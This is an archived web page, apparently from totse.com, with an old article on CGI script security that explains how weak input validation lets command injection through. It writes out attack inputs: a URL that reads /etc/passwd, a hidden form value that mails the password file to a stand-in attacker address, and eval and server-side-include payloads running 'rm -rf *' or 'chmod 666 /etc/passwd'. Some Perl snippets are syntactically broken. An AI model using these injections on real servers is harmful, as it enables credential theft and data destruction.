@@ -1,0 +1,536 @@
+<html>
+<head>
+<title>totse.com | Common Gateway Interface (CGI) Security, Part 1</title>
+<link rel="shortcut icon" href="../../../favicon.ico">
+<link rel="stylesheet" href="../../../styles/totse3.css">
+<script>const SITE_PREFIX = "../../../";</script>
+<script src="../../../assets/ads.js"></script>
+<script src="../../../assets/hot_topics.js"></script>
+</head>
+
+<body background="../../../images/t3/bg.jpg" bgcolor="#2D3856" text="#000000" link="#FFFFFF" vlink="#FFFFFF" alink="#F5F5F5" leftmargin="5" topmargin="5">
+
+<!-- Top of page table -->
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+	<tr valign="center">
+		<td width="43%" align="left">
+			<img src="../../../images/t3/logos/totse01.gif" border="0" width="358" height="43">
+		</td>
+		<td width="2%">&nbsp;</td>
+		<td width="55%" align="right">
+			<!-- Top banner ad slot - filled client-side from the recovered original ad images -->
+			<div class="bannertext"><img id="ad-slot-top" src="" alt="" border="1" style="display:none;"></div>
+		</td>
+	</tr>
+</table>
+
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+	<tr valign="top">
+
+		<!-- Left side navigation tabs -->
+		<td align="right" width="157">
+			<table width="157" border="0" cellpadding="0" cellspacing="0">
+				<tr><td height="50"><img src="../../../images/t3/0.gif"></td></tr>
+			</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">About</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Community</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Art</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Carnality</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Entertainment</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Science</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" background="../../../images/t3/1cm.jpg">
+									<a href="../../../#" target="_top" class="sinactive">Society</a>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+						<table width="157" border="0" cellpadding="0" cellspacing="0">
+							<tr>
+								<td width="13" height="11" background="../../../images/t3/0lt.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="11" background="../../../images/t3/0ct.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+							<tr>
+								<td width="13" height="15" background="../../../images/t3/0lm.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="15" background="../../../images/t3/0cm.jpg">
+									<span class="sactive">Technology</span>
+								</td>
+							</tr>
+							<tr>
+								<td width="13" height="17" background="../../../images/t3/0lb.jpg"><img src="../../../images/t3/0.gif"></td>
+								<td width="144" height="17" background="../../../images/t3/0cb.jpg"><img src="../../../images/t3/0.gif"></td>
+							</tr>
+						</table>
+
+		</td>
+
+		<!-- Content column -->
+		<td align="left">
+			<table width="100%" border="0" cellpadding="0" cellspacing="0">
+
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/3lt.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="11" background="../../../images/t3/3ct.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="11" background="../../../images/t3/3rt.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<!-- Ubiquitous nav menu - placeholders for now, real targets get wired up once we rebuild these sections -->
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/3lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="11" background="../../../images/t3/3cm.jpg" align="right">
+						<span class="navtoppipe">
+							<a href="../../../#" class="navtop">register</a> |
+							<a href="../../../#" class="navtop">bbs</a> |
+							<a href="../../../#" class="navtop">search</a> |
+							<a href="../../../#" class="navtop">rss</a> |
+							<a href="../../../#" class="navtop">faq</a> |
+							<a href="../../../#" class="navtop">about</a>
+						</span>
+					</td>
+					<td width="13" height="11" background="../../../images/t3/3rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/3lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="11" background="../../../images/t3/3cm.jpg" align="right">
+						<span class="navtoppipe">
+							<a href="../../../#" class="navtop">meet up</a> |
+							<a href="../../../#" class="navtop">add to del.icio.us</a> |
+							<a href="../../../#" class="navtop">digg it</a>
+						</span>
+					</td>
+					<td width="13" height="11" background="../../../images/t3/3rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr valign="top">
+					<td width="13" background="../../../images/t3/0cm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" height="640" background="../../../images/t3/0cm.jpg">
+<h1>Common Gateway Interface (CGI) Security, Part 1</h1>
+
+<div class="disclaim"><hr>
+NOTICE: TO ALL CONCERNED Certain text files and messages contained on this site deal with activities and devices which would be in violation of various Federal, State, and local laws if actually carried out or constructed. The webmasters of this site do not advocate the breaking of any law. Our text files and message bases are for informational purposes only. We recommend that you contact your local law enforcement officials before undertaking any project based upon any information obtained from this or any other web site. We do not guarantee that any of the information contained on this system is correct, workable, or factual. We are not responsible for, nor do we assume any liability for, damages resulting from the use of any information on this site. 
+<hr></div>
+
+Introduction<br>
+<br>
+The Common Gateway Interface (CGI) is an interface specification <br>
+that allows communication between client programs and <br>
+information servers which understand the Hyper-Text Transfer <br>
+Protocol (HTTP). TCP/IP is the communications protocol used by <br>
+the CGI script and the server during the communications. The <br>
+default port for communications is port 80 (privileged), but other <br>
+non-privileged ports may be specified. <br>
+<br>
+CGI scripts can perform relatively simple processing on the client <br>
+side. A CGI script can be used to format Hyper-Text Markup <br>
+Language (HTML) documents, dynamically create HTML <br>
+documents, and dynamically generate graphical images. CGI can <br>
+also perform transaction recording using standard input and <br>
+standard output. CGI stores information in system environment <br>
+variables that can be accessed through the CGI scripts. CGI scripts <br>
+can also accept command line arguments. CGI scripts operate in <br>
+two basic modes: <br>
+<br>
+ In the first mode, the CGI script performs rudimentary data <br>
+processing on the input passed to it. An example of data processing <br>
+is the popular web lint page that checks the syntax of HTML <br>
+documents. <br>
+<br>
+ The second mode is where the CGI script acts as a conduit for data <br>
+being passed from the client program to the server, and back from <br>
+the server to the client. For example, a CGI script can be used as a <br>
+front end to a database program running on the server. <br>
+<br>
+<br>
+CGI scripts can be written using compiled programming languages, <br>
+interpreted programming languages, and scripting languages. The <br>
+only real advantage that exists for one type of development tool <br>
+over the other is that compiled programs tend to execute more <br>
+quickly than interpreted programs. Interpreted languages such as <br>
+AppleScript, TCL, PERL and UNIX shell scripts afford the <br>
+possibility of acquiring and modifying the source (discussed later), <br>
+and are generally faster to develop than compiled programs. <br>
+<br>
+The set of common methods available to CGI programs is defined <br>
+in the HTTP 1.0 specification. The three methods pertinent to this <br>
+discussion are the `Get` method, the `Post` method, and the `Put` <br>
+method. The `Get` method retrieves information from the server to <br>
+the client. The `Post` method asks the server to accept information <br>
+passed from the client as input to the specified target. The `Put` <br>
+method asks the server to accept information passed from the client <br>
+as a replacement for the specified target. <br>
+<br>
+<br>
+<br>
+Vulnerabilities<br>
+<br>
+The vulnerabilities caused by the use of CGI scripts are not <br>
+weaknesses in CGI itself, but are weaknesses inherent in the HTTP <br>
+specification and in various system programs. CGI simply allows <br>
+access to those vulnerabilities. There are other ways to exploit the <br>
+system security. For example, insecure file permissions can be <br>
+exploited using FTP or telnet. CGI simply provides more <br>
+opportunities to exploit these and other security flaws. <br>
+<br>
+The CGI specification provides opportunities to read files, acquire <br>
+shell access, and corrupt file systems on server machines and their <br>
+attached hosts. Means of gaining access include: exploiting <br>
+assumptions of the script, exploiting weaknesses in the server <br>
+environment, and exploiting weaknesses in other programs and <br>
+system calls. The primary weakness in CGI scripts is insufficient <br>
+input validation. <br>
+<br>
+According to the HTTP 1.0 specification, data passed to a CGI <br>
+script must be encoded so that it can work on any hardware or <br>
+software platform. Data passed by a CGI script using the Get <br>
+method is appended to the end of a Universal Resource Locator <br>
+(URL). This data can be accessed by the CGI script as an <br>
+environment variable named QUERY_STRING. Data is passed as <br>
+tokens of the form variable=value, with the tokens separated by <br>
+ampersands (&). Actual ampersands, and other non-alphanumeric <br>
+characters, must be escaped, meaning that they are encoded as two-<br>
+digit hexadecimal values. Escaped characters are preceded by a <br>
+percent sign (%) in the encoded URL. It is the responsibility of the <br>
+CGI script to escape or remove characters in user supplied input <br>
+data. Characters such as '&lt;' and '&gt;', the delimiters for HTML tags, <br>
+are usually removed using a simple search and replace operation, <br>
+such as the following: <br>
+<br>
+<br>
+<br>
+# Process input values<br>
+{$NAME, $VALUE) = split(/=/, $_);# split up each variable=value pair<br>
+$VALUE =~ s/\+/ /g;		# Replace '+' with ' '<br>
+$VALUE =~ s/%([0-9|A-F]{2})/pack(C,hex,{$1}}/eg;  # Replace <br>
+%xx characters with ASCII<br>
+# Escape metacharacters<br>
+$VALUE =~ s/([;\*\|'&\$!#\(\)\[\]\{\}:"])/\\$1/g;# remove <br>
+unwanted special characters<br>
+$MYDATA[$NAME} = $VALUE;	# Assign the value to the <br>
+associative array<br>
+<br>
+<br>
+<br>
+This example removes special characters such as the semi-colon <br>
+character, which is interpreted by the shell as a command separator. <br>
+Inclusion of a semi-colon in the input data allows for the <br>
+possibility of appending an additional command to the input. Take <br>
+note of the forward slash characters that precede the characters <br>
+being substituted. In PERL, a backslash is required to tell the <br>
+interpreter not to process the following character.* <br>
+<br>
+The above example is incomplete since it does not address the <br>
+possibility of the new line character '%0a', which can be used to <br>
+execute commands other than those provided by the script. <br>
+Therefore it is possible to append a string to a URL to perform <br>
+functions outside of the script. For example, the following URL <br>
+requests a copy of /etc/passwd from the server machine: <br>
+<br>
+http://www.odci.gov/cgi-bin/query?%0a/bin/cat%20/etc/passwd<br>
+<br>
+<br>
+The strings '%0a" and '%20' are ASCII line feed and blank <br>
+respectively. <br>
+<br>
+The front end interface to a CGI program is an HTML document <br>
+called a form. Forms include the HTML tag &lt;INPUT&gt;. Each <br>
+&lt;INPUT&gt; tag has a variable name associated with it. This is the <br>
+variable name that forms the left hand side of the previously <br>
+mentioned variable=value token. The contents of the variable forms <br>
+the value portion of the token. Actual CGI scripts may perform <br>
+input filtering on the contents of the &lt;INPUT&gt; field. However if <br>
+the CGI script does not filter special characters, then a situation <br>
+analogous to the above example exists. Interpreted CGI scripts that <br>
+fail to validate the &lt;INPUT&gt; data will pass the data directly to the <br>
+interpreter. ** <br>
+<br>
+Another HTML tag sometime seen in forms is the &lt;SELECT&gt; tag. <br>
+&lt;SELECT&gt; tags allow the user on the client side to select from a <br>
+finite set of choices. The selection becomes the right hand side of <br>
+the variable=value token passed to the CGI script. CGI script often <br>
+fail to validate the input from a &lt;SELECT&gt; field, assuming that the <br>
+field will contain only pre-defined data. Again, this data is passed <br>
+directly to the interpreter for interpreted languages. Compiled <br>
+programs which do not perform input validation and/or escape <br>
+special characters may also be vulnerable. <br>
+<br>
+A shell script or PERL script that invokes the UNIX mail program <br>
+may be vulnerable to a shell escape. Mail accepts commands of the <br>
+form '~!command' and forks a shell to execute the command. If the <br>
+CGI script does not filter out the '~!' sequence, the system is <br>
+vulnerable. Sendmail holes can likewise be exploited in this <br>
+manner. Again, the key is to find a script that does not properly <br>
+filter input characters. <br>
+<br>
+If you can find a CGI script that contains a UNIX system() call with <br>
+only one argument, then you have found a doorway into the system. <br>
+When the system() function is invoked with only one argument, the <br>
+system forks a separate shell to handle the request. When this <br>
+happens, it is possible to append data to the input and generate <br>
+unexpected results. For example, a PERL script containing the <br>
+following: <br>
+<br>
+system("/usr/bin/sendmail -t %s &lt; %s", $mailto_address &lt; $input_file");<br>
+<br>
+<br>
+is designed to mail a copy of $input_file to the mail address <br>
+specified in the $mailto_address variable. By calling system() with <br>
+one argument, the program causes a separate shell to be forked. By <br>
+copying and modifying the input to the form: <br>
+<br>
+&lt;INPUT TYPE="HIDDEN" NAME="mailto_address" <br>
+VALUE="address@server.com;mail cracker@hacker.com &lt; /etc/passwd"&gt; <br>
+<br>
+we can exploit this weakness and obtain the password file from the <br>
+server. *** <br>
+<br>
+<br>
+The system() function is not the only command that will fork a new <br>
+shell. the exec() function with a single argument also provides the <br>
+same exposure. Opening a file and piping the result also forks a <br>
+separate shell. In PERL, the function: <br>
+<br>
+open(FILE, "| program_name $ARGS");<br>
+<br>
+will open FILE and pipe the contents to program_name, which will <br>
+run as a separate shell. <br>
+<br>
+In PERL, the eval command parses and executes whatever argument <br>
+is passed to it. CGI scripts that pass arbitrary user input to the eval <br>
+command can be used to execute anything the user desires. For <br>
+example, <br>
+<br>
+$_ = $VALUE;<br>
+s/"/\\"/g		# Escape double quotes<br>
+$RESULT = eval qq/"$_"/;	# evaluate the correctly quoted input<br>
+<br>
+would pass the data from $VALUE to eval essentially unchanged, <br>
+except for ensuring that the double quote don't confuse the <br>
+interpreter (how nice of them). If $VALUE contains "rm -rf *", the <br>
+results will be disastrous. File permissions should be examined <br>
+carefully. CGI scripts that are world readable can be copied, <br>
+modified, and replaced. In addition, PERL scripts that include lines <br>
+such as the following: <br>
+<br>
+require "cgi-lib";<br>
+<br>
+are including a library file named cgi-lib. If this file's permissions <br>
+are insecure, the script is vulnerable. To check file permissions, the <br>
+string '%0a/bin/ls%20-la%20/usr/src/include" could be appended <br>
+to the URL of a CGI script using the Get method. <br>
+<br>
+Copying, modifying, and replacing the library file will allow users <br>
+to execute command or routines inside the library file. Also, if the <br>
+PERL interpreter, which usually resides in /usr/bin, runs as <br>
+SETUID root, it is possible to modify file permissions by passing a <br>
+command directly to the system through the interpreter. The eval <br>
+command example above would permit the execution of : <br>
+<br>
+$_ = "chmod 666 \/etc\/passwd"<br>
+$RESULT = eval qq/"$_"/;<br>
+<br>
+which would make the password file world writable. <br>
+<br>
+There is a feature supported under some HTTPD servers called <br>
+Server Side Includes (SSI). This is a mechanism that allows the <br>
+server to modify the outgoing document before sending it to the <br>
+client browser. SSI is a *huge* security hole, and most everyone <br>
+except the most inexperienced sysadmin has it disabled. However, <br>
+in the event that you discover a site that enables SSI,, the syntax of <br>
+commands is: <br>
+<br>
+&lt;!--#command variable="value" --&gt;<br>
+<br>
+Both command and 'tag' must be lowercase. If the script source does <br>
+not correctly filter input,input such as: <br>
+<br>
+&lt;!--#exec cmd="chmod 666 /etc/passwd"--&gt;<br>
+<br>
+All SSI commands start with a pound sign (#) followed by a <br>
+keyword. "exec cmd" launches a shell that executes a command <br>
+enclosed in the double quotes. If this option is turned on, you have <br>
+enormous flexibility with what you can do on the target machine. <br>
+<br>
+<br>
+<br>
+Conclusion<br>
+<br>
+The improper use of CGI scripts affords users a number of <br>
+vulnerabilities in system security. Failure to validate user input, <br>
+poorly chosen function calls, and insufficient file permissions can <br>
+all be exploited through the misuse of CGI.
+					</td>
+					<td width="13" background="../../../images/t3/0rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr valign="top">
+					<td width="13" background="../../../images/t3/0cm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="97%" background="../../../images/t3/0cm.jpg">
+						<center>
+							&nbsp;<br>
+							<span class="copyright">To the best of our knowledge, the text on this page may be freely reproduced and distributed.</span>
+							<br>&nbsp;<br>
+						</center>
+					</td>
+					<td width="13" background="../../../images/t3/0rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr valign="bottom">
+					<td width="13" height="15" background="../../../images/t3/3lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="96%" height="15" background="../../../images/t3/3cm.jpg">
+						&nbsp;
+						<center><span class="navbotpipe"><span class="navbot"><a href="../../../#" class="navbot">About</a> | <a href="../../../#" class="navbot">Community</a> | <a href="../../../#" class="navbot">Art</a> | <a href="../../../#" class="navbot">Carnality</a> | <a href="../../../#" class="navbot">Entertainment</a> | <a href="../../../#" class="navbot">Science</a> | <a href="../../../#" class="navbot">Society</a> | <a href="../../../#" class="navbot">Technology</a></span></span></center>
+					</td>
+					<td width="13" height="15" background="../../../images/t3/3rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+				<tr>
+					<td width="13" height="17" background="../../../images/t3/3lb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="96%" height="17" background="../../../images/t3/3cb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="17" background="../../../images/t3/3rb.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+
+			</table>
+		</td>
+
+		<!-- Right sidebar: Hot Topics (real random threads, JS-populated) + ad slots -->
+		<td width="20%" align="center" valign="top">
+
+			<table width="170" border="0" cellpadding="0" cellspacing="0">
+				<tr>
+					<td width="13" height="11" background="../../../images/t3/1lt.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="144" height="11" background="../../../images/t3/1ct.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="11" background="../../../images/t3/1rt.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+				<tr>
+					<td width="13" background="../../../images/t3/1lm.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="144" background="../../../images/t3/1cm.jpg">
+						<center><span class="hottop">Hot Topics</span></center>
+						<table border="0" cellpadding="1" cellspacing="2" width="100%" id="hot-topics-list">
+							<!-- populated client-side with 10 random real threads from the archive -->
+						</table>
+					</td>
+					<td width="13" background="../../../images/t3/1rm.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+				<tr>
+					<td width="13" height="17" background="../../../images/t3/1lb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="144" height="17" background="../../../images/t3/1cb.jpg"><img src="../../../images/t3/0.gif"></td>
+					<td width="13" height="17" background="../../../images/t3/1rb.jpg"><img src="../../../images/t3/0.gif"></td>
+				</tr>
+			</table>
+
+			&nbsp;
+
+			<!-- Recovered original ad images, rotated randomly client-side - nostalgia only, not live/tracking ads -->
+			<center>
+				<img id="ad-slot-mini-1" src="" alt="" border="1" style="display:none;">
+				<br>&nbsp;<br>
+				<img id="ad-slot-mini-2" src="" alt="" border="1" style="display:none;">
+			</center>
+
+		</td>
+	</tr>
+</table>
+
+<script src="../../../assets/site.js"></script>
+
+</body>
+</html>
